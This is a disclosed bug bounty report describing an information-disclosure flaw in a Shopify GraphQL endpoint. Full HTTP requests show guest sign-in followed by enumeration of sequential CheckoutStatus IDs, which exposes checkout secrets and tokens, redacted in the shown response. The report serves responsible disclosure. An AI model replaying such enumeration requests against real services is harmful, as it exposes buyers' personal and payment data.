# Informations disclosure - Access to some checkout informations

## Report Details
- **Report ID**: 1064869
- **URL**: https://hackerone.com/reports/1064869
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-12-22T23:45:25.797Z
- **Disclosed**: 2021-03-13T00:51:20.556Z

## Reporter
- **Username**: imgnotfound
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
It came to my attention that using the **CheckoutStatus** query on `https://arrive-server.shopifycloud.com/graphql` it is possible to access some checkout details, specifically the query can be called with an ID value ranging from `1` up to `48908`. 

Unfortunately, as I could not figure out how to create a new `CheckoutStatus` on my own, I won't be able to dig deeper. I've tried to create a new order on my own shops and when accessing the next ID (48909), it is still returning nothing. 

That said, an explanation could either be that the **CheckoutStatus** query isn't used anymore thus only returning "legacy" orders or simply that the `id` property type has been changed from an Integer to an unpredictable one (i.e.: UUID).

## Steps to reproduce

.1. Make the following request

```
POST /graphql HTTP/1.1
Host: arrive-server.shopifycloud.com
Accept: */*
If-None-Match: W/"9753ba99576a2d7d3e7e0331a16c5b8e"
Accept-Language: en-ca
Content-Type: application/json
Content-Length: 230
User-Agent: Shop/2.15.4-release+377 ios/14.2
Connection: close

{"operationName":"SignInAsGuest","variables":{},"query":"mutation SignInAsGuest {\n  signInAsGuest {\n    authPayload {\n      accessToken\n      refreshToken\n    }\n    userErrors {\n      field\n      message\n    }\n  }\n}\n"}
```

.2. From the returned payload, copy the `accessToken` value
.3. Make the following request, by making sure to replace the {accessToken} placeholder with the previous step `accessToken` value

```
POST /graphql HTTP/1.1
Host: arrive-server.shopifycloud.com
Accept: */*
Authorization: Bearer {accessToken}
Accept-Encoding: gzip, deflate
If-None-Match: W/"5ebae03d57dd7da47f078e11e3cfc0db"
Accept-Language: en-ca
Content-Type: application/json
Content-Length: 348
User-Agent: Shop/2.15.4-release+377 ios/14.2
Connection: close

{"operationName":"CheckoutStatus","variables":{"id":"48805"  },"query":"query CheckoutStatus($id: ID!) {\n  checkoutStatus(id: $id) {\n    ... on Checkout {\n      id\n      isShopPay\n      payJsonParams\n      status\n      token\n      url\n      errorCode\n    }\n    ... on PollingInfo {\n      waitMillis\n      shouldRetry\n    }\n  }\n}\n"}
```

**Response**
```
{"data":{"checkoutStatus":{"id":"48805","isShopPay":true,"payJsonParams":"{\"transaction_params\":\"checkout_secret=███\\u0026encrypted_params=███\\u0026locale=en\",\"token\":\"█████████\",\"origin\":\"shop_app\",\"shopify_domain\":\"sunday-citizen.myshopify.com\",\"checkout_token\":\"████████\"}","status":"created","token":"████████","url":"https://shop.app/pay/session","errorCode":null}}}
```
By looking at the returned response, specifically the `payJsonParams` property, it should then be possible to access the checkout page as the checkout secret and token are being returned. Therefore, we should get access to the buyer's email  and probably even more informations if the purchase has been completed.

## Impact

Access to some checkout informations

## Attachments
No attachments
